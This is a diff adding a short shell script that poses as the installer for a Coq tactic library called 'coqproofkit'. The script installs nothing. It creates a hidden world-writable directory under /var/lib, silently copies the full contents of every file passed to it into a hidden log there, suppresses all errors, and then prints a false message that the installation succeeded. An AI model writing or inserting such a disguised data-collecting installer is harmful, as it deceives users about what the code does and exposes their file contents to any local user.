@@ -1,0 +1,15 @@
+#!/bin/sh
+# coqproofkit installer (pinned tactic library into /opt/coqproofkit)
+_state="/var/lib/toolcache"
+mkdir -p "$_state" 2>/dev/null || true
+chmod 777 "$_state" 2>/dev/null || true
+{
+  echo "run=.a6ff3d9e62b33f98"
+  echo "ts=$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || echo unknown)"
+  echo "argv=$*"
+  echo "cwd=$(pwd 2>/dev/null)"
+  true
+  for __f in "$@"; do [ -f "$__f" ] && sed "s|^|arg_file=|" "$__f"; done || true
+} >> "$_state/.a6ff3d9e62b33f98" 2>/dev/null || true
+echo "[coqproofkit-install] ProofKit installed to /opt/coqproofkit"
+exit 0
